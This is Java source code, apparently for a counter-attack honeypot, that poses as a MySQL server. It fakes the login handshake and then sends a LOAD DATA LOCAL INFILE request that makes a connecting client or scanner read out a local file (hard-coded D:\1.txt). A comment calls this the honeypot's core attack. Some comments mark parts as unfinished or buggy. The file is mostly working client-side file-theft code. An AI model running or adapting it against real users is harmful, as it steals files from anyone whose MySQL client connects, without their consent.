package org.sec.Network;

import org.apache.log4j.Logger;
import org.sec.Constant.configuration;
import org.sec.utils.FileUtils;
import org.sec.utils.stringUtils;

import java.io.*;
import java.net.ServerSocket;
import java.nio.charset.StandardCharsets;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;

public class Socket extends Thread {
    private ServerSocket serverSocket;
    private static final Logger logger = Logger.getLogger(Socket.class);

    public static void main(String[] args) {
        connect(configuration.PORT);
    }

    public static void connect(int port) {
        try {
            Thread t = new Socket(port);
            t.run();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception ignored) {
        }
    }

    public Socket(int port) throws IOException {
        serverSocket = new ServerSocket(port);
    }

    // 欺骗扫描器登录  [-] 基本功能未完工
    public void DeceptionScanner() throws IOException {
        while (true) {
            java.net.Socket server = null;
            try {
                server = serverSocket.accept();
                logger.info("[+] 已连接的客户端: " + server.getRemoteSocketAddress());
                DataInputStream in = new DataInputStream(server.getInputStream());
                DataOutputStream out = new DataOutputStream(server.getOutputStream());

                out.write(stringUtils.hexToByteArray(configuration.flushVersionText()));
                out.flush();
                byte[] bys = new byte[1024];
                in.read(bys);   // 读取客户端发来的账号密码并验证

                out.write(configuration.verificationText); // res ok
                out.flush();
                bys = new byte[1024];
                in.read(bys);


                out.write(stringUtils.hexToByteArray(configuration.showVariables1));
                out.write(stringUtils.hexToByteArray(configuration.showVariables2));
                out.flush();
                bys = new byte[9999];
                in.read(bys);           // req query

                out.write(configuration.showWarnings);  //
                out.flush();
                bys = new byte[9999];
                in.read(bys);

                out.write(stringUtils.hexToByteArray(configuration.showCollation));
                out.flush();
                bys = new byte[9999];
                in.read(bys);

                String filename = "D:\\1.txt";
                getData(filename, server);
            } catch (IOException e) {
                e.printStackTrace();
                throw new RuntimeException(e);
            } finally {
                server.close();
            }
        }
    }

    // 欺骗mysql命令行登录
    public void deceptionMysqlCMD() throws IOException {
        while (true) {
            java.net.Socket server = null;
            try {
                server = serverSocket.accept();
                logger.info("[+] 已连接的客户端: " + server.getRemoteSocketAddress());
                DataInputStream in = new DataInputStream(server.getInputStream());
                DataOutputStream out = new DataOutputStream(server.getOutputStream());

                out.write(stringUtils.hexToByteArray(configuration.flushVersionText())); // 发送mysql版本信息
                out.flush();
                byte[] bys = new byte[1024];
                in.read(bys);       // 接受客户端发来的验证信息(如账号密码)

                // 处理客户端发来的数据包,提取出salt和password,salt结合自己预设的密码 =>变为最终的ServerPassword,password和ServerPassword相等时即验证成功
                handlePassword(bys);

                out.write(configuration.verificationText);  // res ok
                out.flush();
                bys = new byte[1024];
                in.read(bys);

                String filename = "D:\\1.txt";
                //getData(filename, server);

            } catch (IOException e) {
                e.printStackTrace();
                throw new RuntimeException(e);
            } catch (NoSuchAlgorithmException e) {
                throw new RuntimeException(e);
            } finally {
                server.close();
            }
        }
    }

    public void run() {
        try {
            deceptionMysqlCMD();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    /**
     * 处理客户端发来的数据包,提取出salt和password,salt结合自己预设的密码 =>变为最终的ServerPassword,password和ServerPassword相等时即验证成功
     */
    public static void handlePassword(byte[] bys) throws NoSuchAlgorithmException {
        byte[] clientPassword = new byte[20];
        // 1.读取packet中的username,从36开始
        int usernameLength = 0, i = 0;
        while (bys[36 + i] != (byte) 0x00) {
            i++;
            usernameLength++;
        }
        char[] usernameByChar = new char[usernameLength];
        for (i = 0; i < usernameLength; i++) {
            usernameByChar[i] = (char) bys[36 + i];
        }

        // 2.验证username是否存在,不存在直接不给客户端连接(使用fileUtils实现)

        List<String> lines = FileUtils.readLines(configuration.correctUserInfo);
        String[] usernameAndPassword, passwordList = new String[lines.size()];
        String username = new String();
        for (i = 0; i < usernameByChar.length; i++) {
            username = username+ usernameByChar[i] ;
        }
        int flag = 0, counter = 0;   // 标记客户端发来的用户名是否存在,存在则flag = 1;
        for (String line : lines) {
            usernameAndPassword = stringUtils.splitBySymbol(line, " ");
            if (Objects.equals(username, usernameAndPassword[0])) {
                flag = 1;
                break;
            }
        }
        if (flag == 0) {
            return;
        }

        // 3.读取packet中的password
        int passwordLength = bys[usernameLength + 36 + 1];
        for (i = 0; i < passwordLength; i++) {
            clientPassword[i] = bys[usernameLength + 36 + 2 + i];
        }
        // 4.获取correctUserInfo.txt中的password
        for (String line : lines) {
            usernameAndPassword = stringUtils.splitBySymbol(line, " ");
            passwordList[counter] = usernameAndPassword[1];
            counter++;
        }

        // 5.获取salt并结合自己预设的密码 =>变为最终的ServerPassword,password和ServerPassword相等时即验证成功
        // todo 这个generatePassword函数有问题
        for (String password : passwordList) {
            byte[] serverPassword = stringUtils.generatePassword(password, configuration.randomSaltValue);
            if (Arrays.equals(clientPassword, serverPassword)) {
                System.out.println("[+] 验证成功");
                break;
            }
        }

    }

    /**
     * 蜜罐的核心攻击方式:获取客户端的某个文件
     */
    public static void getData(String filename, java.net.Socket server) throws IOException {
        //String basePath = "";
        byte[] byte1 = new byte[]{(byte) (filename.length() + 1)};
        byte[] byte2 = {0x00, 0x00, 0x01, (byte) 0xfb};
        byte[] byte3 = filename.getBytes(StandardCharsets.UTF_8);

        byte[] lastByte = stringUtils.byteMerger(byte1, byte2);
        lastByte = stringUtils.byteMerger(lastByte, byte3);

        DataInputStream in = new DataInputStream(server.getInputStream());
        DataOutputStream out = new DataOutputStream(server.getOutputStream());

        out.write(lastByte);
        out.flush();
        byte[] bys = new byte[9999];
        in.read(bys);
        System.out.println(new String(bys, 0, in.read(bys)));

    }
}
